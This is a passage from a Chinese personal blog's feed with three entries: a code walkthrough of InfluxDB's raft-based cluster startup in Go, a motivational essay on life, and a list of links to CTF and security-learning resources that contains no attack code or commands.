class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// open opens and initializes the raft store.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *store)</span> <span class="title">open</span><span class="params">(raftln net.Listener)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">s.logger.Info(<span class="string">"Using data dir"</span>, zap.String(<span class="string">"datadir"</span>, s.path))</span><br><span class="line"></span><br><span class="line">joinPeers, err := s.filterAddr(s.config.JoinPeers, s.httpAddr)  <span class="comment">// 获取所有的peers</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">joinPeers = s.config.JoinPeers <span class="comment">//所有的joinPeers列表，不是很理解这边过滤有啥用，上面过滤之后，这边又覆盖了？</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> initializePeers []<span class="keyword">string</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(joinPeers) &gt; <span class="number">0</span> &#123;</span><br><span class="line">c := NewClient()</span><br><span class="line">c.SetMetaServers(joinPeers)</span><br><span class="line">c.SetTLS(s.config.HTTPSEnabled)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">peers := c.peers()</span><br><span class="line"><span class="keyword">if</span> !Peers(peers).Contains(s.raftAddr) &#123;</span><br><span class="line">peers = <span class="built_in">append</span>(peers, s.raftAddr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(s.config.JoinPeers)-<span class="built_in">len</span>(peers) == <span class="number">0</span> &#123;</span><br><span class="line">initializePeers = peers</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(peers) &gt; <span class="built_in">len</span>(s.config.JoinPeers) &#123;</span><br><span class="line">s.logger.Info(fmt.Sprintf(<span class="string">"waiting for join peers to match config specified. found %v, config specified %v"</span>, peers, s.config.JoinPeers))</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">s.logger.Info(fmt.Sprintf(<span class="string">"Waiting for %d join peers.  Have %v. Asking nodes: %v"</span>, <span class="built_in">len</span>(s.config.JoinPeers)-<span class="built_in">len</span>(peers), peers, joinPeers))</span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(time.Second)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := s.setOpen(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create the root directory if it doesn't already exist.</span></span><br><span class="line"><span class="keyword">if</span> err := os.MkdirAll(s.path, <span class="number">0777</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"mkdir all: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open the raft store.</span></span><br><span class="line">    <span class="comment">// raft选主</span></span><br><span class="line"><span class="keyword">if</span> err := s.openRaft(initializePeers, raftln); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"raft: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(joinPeers) &gt; <span class="number">0</span> &#123;</span><br><span class="line">c := NewClient()</span><br><span class="line">c.SetMetaServers(joinPeers)</span><br><span class="line">c.SetTLS(s.config.HTTPSEnabled)</span><br><span class="line"><span class="keyword">if</span> err := c.Open(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> c.Close()</span><br><span class="line"></span><br><span class="line">n, err := c.JoinMetaServer(s.httpAddr, s.raftAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">s.node.ID = n.ID</span><br><span class="line"><span class="keyword">if</span> err := s.node.Save(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait for a leader to be elected so we know the raft log is loaded</span></span><br><span class="line"><span class="comment">// and up to date</span></span><br><span class="line">    <span class="comment">//等待选主leader</span></span><br><span class="line"><span class="keyword">if</span> err := s.waitForLeader(<span class="number">0</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make sure this server is in the list of metanodes</span></span><br><span class="line">    <span class="comment">// 获取raft的peers</span></span><br><span class="line">peers, err := s.raftState.peers()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(peers) &lt;= <span class="number">1</span> &#123;</span><br><span class="line"><span class="comment">// we have to loop here because if the hostname has changed</span></span><br><span class="line"><span class="comment">// raft will take a little bit to normalize so that this host</span></span><br><span class="line"><span class="comment">// will be marked as the leader</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">err := s.setMetaNode(s.httpAddr, s.raftAddr)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(<span class="number">100</span> * time.Millisecond)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数选主流程：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *raftState)</span> <span class="title">open</span><span class="params">(s *store, ln net.Listener, initializePeers []<span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">r.ln = ln</span><br><span class="line">r.closing = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Setup raft configuration.</span></span><br><span class="line">config := raft.DefaultConfig()</span><br><span class="line">config.LogOutput = ioutil.Discard</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> r.config.ClusterTracing &#123;</span><br><span class="line">config.Logger = log.New(os.Stderr, <span class="string">"[raft]"</span>, log.LstdFlags)</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 超时</span></span><br><span class="line">config.HeartbeatTimeout = time.Duration(r.config.HeartbeatTimeout)</span><br><span class="line">config.ElectionTimeout = time.Duration(r.config.ElectionTimeout)</span><br><span class="line">config.LeaderLeaseTimeout = time.Duration(r.config.LeaderLeaseTimeout)</span><br><span class="line">config.CommitTimeout = time.Duration(r.config.CommitTimeout)</span><br><span class="line"><span class="comment">// Since we actually never call `removePeer` this is safe.</span></span><br><span class="line"><span class="comment">// If in the future we decide to call remove peer we have to re-evaluate how to handle this</span></span><br><span class="line">config.ShutdownOnRemove = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Build raft layer to multiplex listener.</span></span><br><span class="line">    <span class="comment">// 构建raft层</span></span><br><span class="line">r.raftLayer = newRaftLayer(r.addr, r.ln)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a transport layer</span></span><br><span class="line">    <span class="comment">//创建网络传输层</span></span><br><span class="line">r.transport = raft.NewNetworkTransport(r.raftLayer, <span class="number">3</span>, <span class="number">10</span>*time.Second, config.LogOutput)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create peer storage.</span></span><br><span class="line">r.peerStore = &amp;peerStore&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This server is joining the raft cluster for the first time if initializePeers are passed in</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(initializePeers) &gt; <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := r.peerStore.SetPeers(initializePeers); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">peers, err := r.peerStore.Peers()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If no peers are set in the config or there is one and we are it, then start as a single server.</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(initializePeers) &lt;= <span class="number">1</span> &#123;</span><br><span class="line">config.EnableSingleNode = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Ensure we can always become the leader</span></span><br><span class="line">config.DisableBootstrapAfterElect = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Make sure our peer address is here.  This happens with either a single node cluster</span></span><br><span class="line"><span class="comment">// or a node joining the cluster, as no one else has that information yet.</span></span><br><span class="line"><span class="keyword">if</span> !raft.PeerContained(peers, r.addr) &#123;</span><br><span class="line"><span class="keyword">if</span> err := r.peerStore.SetPeers([]<span class="keyword">string</span>&#123;r.addr&#125;); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">peers = []<span class="keyword">string</span>&#123;r.addr&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create the log store and stable store.</span></span><br><span class="line">    <span class="comment">// 创建log存储</span></span><br><span class="line">store, err := raftboltdb.NewBoltStore(filepath.Join(r.path, <span class="string">"raft.db"</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"new bolt store: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">r.raftStore = store</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create the snapshot store.</span></span><br><span class="line">    <span class="comment">// 创建文件快照存储</span></span><br><span class="line">snapshots, err := raft.NewFileSnapshotStore(r.path, raftSnapshotsRetained, os.Stderr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"file snapshot store: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create raft log.</span></span><br><span class="line">    <span class="comment">// 新建raft</span></span><br><span class="line">ra, err := raft.NewRaft(config, (*storeFSM)(s), store, store, snapshots, r.peerStore, r.transport)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"new raft: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">r.raft = ra</span><br><span class="line"></span><br><span class="line">r.wg.Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> r.logLeaderChanges()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;influxdb集群代码分析&quot;&gt;&lt;a href=&quot;#influxdb集群代码分析&quot; class=&quot;headerlink&quot; title=&quot;influxdb集群代码分析&quot;&gt;&lt;/a&gt;influxdb集群代码分析&lt;/h2&gt;&lt;p&gt;本文主要分析下influxdb中cluste
      
    
    </summary>
    
    
      <category term="influxdb" scheme="http://www.mydreamdll.xyz/categories/influxdb/"/>
    
    
      <category term="influxdb" scheme="http://www.mydreamdll.xyz/tags/influxdb/"/>
    
  </entry>
  
  <entry>
    <title>发篇心灵鸡汤</title>
    <link href="http://www.mydreamdll.xyz/2020/02/16/%E5%BF%83%E7%81%B5%E9%B8%A1%E6%B1%A4/"/>
    <id>http://www.mydreamdll.xyz/2020/02/16/%E5%BF%83%E7%81%B5%E9%B8%A1%E6%B1%A4/</id>
    <published>2020-02-16T11:47:41.228Z</published>
    <updated>2020-02-16T11:46:12.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="发篇心灵鸡汤"><a href="#发篇心灵鸡汤" class="headerlink" title="发篇心灵鸡汤"></a>发篇心灵鸡汤</h2><p>想要有意义的人生，本身就是很累。成天无所事事，那和死了有什么区别？死亡才是永久的休息，那才是真正的一劳永逸。我们得像那热水里的青蛙，在水中折腾翻滚，保持对生命的热忱。这本是生命本该有的状态。</p><p>人生没有永远的伤痛，再深的痛，伤口总会痊愈。人生没有过不去的坎，你不可以坐在坎边等它消失，你只能想办法穿过它。人生，没有永远的爱情，没有结局的感情，总要结束;不能拥有的人，总会忘记。慢慢地，你不会再流泪;慢慢地，一切都过去了……适当的放弃，是人生优雅的转身。</p><p>人生需要一种平衡。这方面得到的多了，其他就会失去一些。没有十全十美的人生，也不会有万事如意的生活。谁也不可能把所有的好处都占尽，也不可能倒霉到一无所有。失去的时候，要看看自己得到的；成功的时候，也要想想自己付出的。成败也好，得失也罢，无非相对而言，只在于你如何看待。</p><p>人生就像马拉松，获胜的关键不在于瞬间的爆发，而在于途中的坚持。你纵有千百个理由放弃，也要给自己找一个坚持下去的理由。很多时候，成功就是多坚持一分钟，这一分钟不放弃，下一分钟就会有希望。只是我们不知道，这一分钟会在什么时候出现。再苦再累，只要坚持走下去,属于你的风景终会出现。</p><p>人生就像骑自行车，想保持平衡就得往前走。人生总是在苦恼中循环往复，挣扎不出；得不到的想得到，得到了又怕失去，总觉得别人得到的比自己得到的多。我们每个人都在挣扎中撰写自己的人生。</p><p>人生是一列单向行驶的火车，中途会有许多大大小小的站点停靠，但是永远不售返程车票。在这列火车上，有些事情可以做，有些事情必须做，有些事情可做可不做，有些事情坚决不能做，做与不做的选择，决定了人生的方向；做多做少的差别，决定了人生的高度；做好做坏的结果，决定了人生的质量。</p><p>人生如棋，黑与白的交错，生与死的交融；人生如棋，所以有了”闲敲棋子落花灯“的闲适，”长人只消一棋局“的洒脱；人生如棋，这是一种竞争，亦是一种调和，漫漫人生，变换不定，令人也难免举棋不定。棋势无定，棋局难料，以不变应万变，胸有成竹，等闲应对看春秋。</p><p>人生像一本厚重的书，扉页是我们的梦想，目录是我们的脚印，内容是我们的精彩，后记是我们的回望。有些书是没有主角的，因为我们忽视了自我;有些书是没有线索的，因为我们迷失了自我；有些书是没有内容的，因为我们埋没了自我。唯有把自己当成主角和主线，我们才能写出属于自己的东西。</p><p>人生是一列单向行驶的火车，中途会有许多大大小小的站点停靠，但是永远不售返程车票。在这列火车上，有些事情可以做，有些事情必须做，有些事情可做可不做，有些事情坚决不能做，做与不做的选择，决定了人生的方向；做多做少的差别，决定了人生的高度；做好做坏的结果，决定了人生的质量。</p><p>世界没有悲剧和喜剧之分，如果你能从悲剧中走出来，那就是喜剧，如果你沉缅于喜剧之中，那它就是悲剧。如果你只是等待，发生的事情只会是你变老了。人生的意义不在于拿一手好牌，而在于打好一手坏牌。</p><p>宠辱不惊来去无意，如此心宁静，优雅随之。只有阳光而无阴影，只有欢乐而无痛苦，那就不是人生。在人生的清醒的时刻，在哀痛和伤心的阴影之下，人们真实的自我最接近。人生就像一杯没有加糖的咖啡，喝起来是苦涩的，回味起来却有久久不会褪去的余香。</p><p>欣赏的心情是一种积极的世界观，是一种健康、阳光的心态，是真正的快乐之源。人拥有一颗欣赏之心，世间皆是亮丽的风景；用欣赏的眼睛看自己，才能内心愉悦、心底生花。万事万物，你仰视它就伟大，你欣赏它就可爱。学会欣赏，你便拥有快乐；懂得欣赏，你便懂得生活的真谛。拥有欣赏之心，才有幸福人生。</p><p>生命很短暂，别把那些重要的话憋着，会没有时间说的。安静，明白了一个人的时光，人生，总有太多期待一直失望，总有太多梦想一直落空，总有太多言语无人可诉。有些人，深深记住，未必不是幸福；坎坷路途，给身边一份温暖；风雨人生，给自己一个微笑。生活，就是把快乐装在心中，一路向前。</p><p>岁月里看的是书，读的却是世界；日子沏的是茶，尝的却是生活。生活就是理解，生活就是面对现实微笑。生活就是越过心灵的障碍，平静心性；生活就是越过障碍，注视将来；生活就是知道自己的价值，自己所能做到的与自己所应该做到的。不要用苛刻的眼神看生活，生活的本身就是百味杂陈，人生就是风雨兼程。</p><p>我们常常被一个”争“字所纷扰，争到最后，原本阔大渺远的尘世，只剩下一颗自私的心了。心胸开阔一些；得失看轻一些；为别人多考虑一些，哪怕只是少争一点，把看似要紧的东西淡然地放一放，你会发现，人心会一下子变宽，世界会一下子变大。不争，人生至境！</p><p>世界的大小，人生的苦乐，心绪的好坏，全取决于你所处的位置。在这个物欲横流的世界里提升一个位置看世界，给自己的思想提升高度，给自己的灵魂储蓄深度，给自己的知识积累厚度，给自己的心灵增加纯度，才能拥有快乐的生活，站在另一个高度俯视世界，学会在平淡的日子里，享受那一份宁静美丽的人生吧。</p><p>生命的历程中，圆满只是憧憬，只是我们内心的愿景。一些事，用心了，尽力了，纵然不是圆满，也是一种美好。一些情，在意了，努力了，即使不是完美，也是一种纯真。人生路上，虽有精彩，但更多的是平淡。人生的路要自己走，事要自己做，我们就是于平凡的生活中，演绎着我们的人生，无怨无悔，继续前行！</p><p>人生就是一次感恩之旅，为爱要感恩，为恨也要感恩；感恩朋友，也要感恩对手。爱让你温暖感动，恨令你警策自省；朋友加持你的信心，对手磨练你的坚韧。带着一颗感恩的心行世，你就懂得谦卑恻隐；用一颗感恩的心待人处事，你才有宏大的格局，广阔的胸襟。这个世界不欠你，而你却欠着整个世界。</p><p>你若懂得知足，就会感到幸福。幸福不是得到的多，而是计较的少。幸福不是拥有的多，而是抱怨的少。坚强，不是面对悲伤不流一滴泪，而是痛哭过后笑着生活。亲情、友情、爱情，不是得到就是学到。无论爱与被爱，只要懂得、舍得、值得，那便是无憾人生。人生最永恒的幸福是平凡，人生最永远的拥有是珍惜。</p><p>人生再多的幸运、再多的不幸，都是曾经，都是过去。一如窗外的雨，淋过，湿过，走了，远了感悟人生。曾经的美好留于心底，曾经的悲伤置于脑后，不恋不恨。过去终是过去，那人，那事，那情，任你留恋，都是云烟。学会忘记，懂得放弃，人生总是从告别中走向明天。</p><p>人生越成功越淡然。做人成功以心胸宽广为基础，做事成功以百事能忍为起点。心宽则不计较，能忍则不躁动，不计较，不躁动便是淡然。淡然不是麻木，而是内心的稳健。对于感情，知道聚散都是缘，缘尽即散，惋惜也无益。对于事业，了悟成败都是向前，成则继续，败则完善，不必大喜大悲。淡然，让人生超脱。</p><p>人生难得一心静。心静才能心安。心浮气躁之人，做人缺乏和善，做事缺乏耐心，势必会让人生陷入僵局。克制浮躁，唯有静心。静心，需要用理智去稀释狂乱的情感，用豁达去释放囚禁的过去，用坦然去迎接不可预知的未来。让心静下来，你才能读懂自己、看清未来。静心，是一种修炼也是一种修养。</p><p>纪念疫情，纪念远去的日子。谢谢。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;发篇心灵鸡汤&quot;&gt;&lt;a href=&quot;#发篇心灵鸡汤&quot; class=&quot;headerlink&quot; title=&quot;发篇心灵鸡汤&quot;&gt;&lt;/a&gt;发篇心灵鸡汤&lt;/h2&gt;&lt;p&gt;想要有意义的人生，本身就是很累。成天无所事事，那和死了有什么区别？死亡才是永久的休息，那才是真正的一劳永逸。
      
    
    </summary>
    
    
      <category term="心灵鸡汤" scheme="http://www.mydreamdll.xyz/categories/%E5%BF%83%E7%81%B5%E9%B8%A1%E6%B1%A4/"/>
    
    
      <category term="心灵鸡汤" scheme="http://www.mydreamdll.xyz/tags/%E5%BF%83%E7%81%B5%E9%B8%A1%E6%B1%A4/"/>
    
  </entry>
  
  <entry>
    <title>CTF 学习资料整理</title>
    <link href="http://www.mydreamdll.xyz/2020/02/13/ctf%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/"/>
    <id>http://www.mydreamdll.xyz/2020/02/13/ctf%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/</id>
    <published>2020-02-13T08:32:50.116Z</published>
    <updated>2020-02-13T08:30:21.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CTF-学习资料整理"><a href="#CTF-学习资料整理" class="headerlink" title="CTF 学习资料整理"></a>CTF 学习资料整理</h2><p>多个地方转载整理：</p><p>php代码解密<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fzhaoyuanma.com%2F" target="_blank" rel="noopener">https://zhaoyuanma.com/</a><br> Python <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fdocs.python.org%2Fzh-cn%2F3.7%2F" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3.7/</a><br> 渗透师<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.shentoushi.top%2Fnetwork" target="_blank" rel="noopener">https://www.shentoushi.top/network</a><br> DVWA攻略<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.freebuf.com%2Farticles%2Fweb%2F119150.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/119150.html</a><br> WEB安全学习笔记<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwebsec.readthedocs.io%2Fzh%2Flatest%2F" target="_blank" rel="noopener">https://websec.readthedocs.io/zh/latest/</a><br> 信息安全书籍<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.moondream.cn%2F%3Fp%3D851" target="_blank" rel="noopener">https://www.moondream.cn/?p=851</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FCHYbeta%2FWeb-Security-Learning%2Fblob%2Fmaster%2FREADME.md%23mongodb" target="_blank" rel="noopener">https://github.com/CHYbeta/Web-Security-Learning/blob/master/README.md#mongodb</a></p><p>高持续渗透<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fmicropoor.blogspot.com%2F" target="_blank" rel="noopener">https://micropoor.blogspot.com/</a><br> 安全攻防工具<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.ms08067.com%2Ftool.html" target="_blank" rel="noopener">https://www.ms08067.com/tool.html</a><br> 0day银行<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.0daybank.org%2F%3Fpage_id%3D2" target="_blank" rel="noopener">http://www.0daybank.org/?page_id=2</a><br> 零日安全论坛<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.jmpoep.com%2Fforum.php" target="_blank" rel="noopener">https://www.jmpoep.com/forum.php</a><br> CTF常用工具速查网<br> <a href="https://www.jianshu.com/p/ab24f22599a2" target="_blank" rel="noopener">https://www.jianshu.com/p/ab24f22599a2</a><br> 黑客街<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.hackjie.com%2F" target="_blank" rel="noopener">https://www.hackjie.com/</a><br> redteam <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.itcodemonkey.com%2Farticle%2F6375.html" target="_blank" rel="noopener">https://www.itcodemonkey.com/article/6375.html</a><br> Mac下<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fxclient.info" target="_blank" rel="noopener">https://xclient.info</a><br> <strong>WP</strong><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fctf.writeup.wiki%2F" target="_blank" rel="noopener">https://ctf.writeup.wiki/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.ctfwp.com%2F" target="_blank" rel="noopener">https://www.ctfwp.com/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F4862" target="_blank" rel="noopener">https://xz.aliyun.com/t/4862</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F4904" target="_blank" rel="noopener">https://xz.aliyun.com/t/4904</a></p><p><strong>PWN学习</strong><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fzoepla.github.io%2F2018%2F04%2Fpwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%2F" target="_blank" rel="noopener">https://zoepla.github.io/2018/04/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</a><br> <strong>逆向</strong><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fbbs.pediy.com%2Fthread-247176.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-247176.htm</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Ftxwtech%2Farticle%2Fdetails%2F79189345" target="_blank" rel="noopener">https://blog.csdn.net/txwtech/article/details/79189345</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.dtdebug.com%2Fforum.php%3Fmod%3Dviewthread%26tid%3D3211%26mobile%3D2" target="_blank" rel="noopener">http://www.dtdebug.com/forum.php?mod=viewthread&amp;tid=3211&amp;mobile=2</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.pansoso.com%2Fg%2F899437%2F" target="_blank" rel="noopener">http://www.pansoso.com/g/899437/</a><br> <strong>渗透测试</strong><br> 渗透脑图<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FAscotbe%2FOsmographic-brain-mapping" target="_blank" rel="noopener">https://github.com/Ascotbe/Osmographic-brain-mapping</a><br> 1）玄魂工作室–内部资源清单<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fxuanhun%2FHackingResource" target="_blank" rel="noopener">https://github.com/xuanhun/HackingResource</a><br> 2）KaliLinuxWeb渗透测试手册(第二版)-6.7-利用XML外部实体注入<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F6_sbkXFckb29bq08flhAOA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/6_sbkXFckb29bq08flhAOA</a><br> 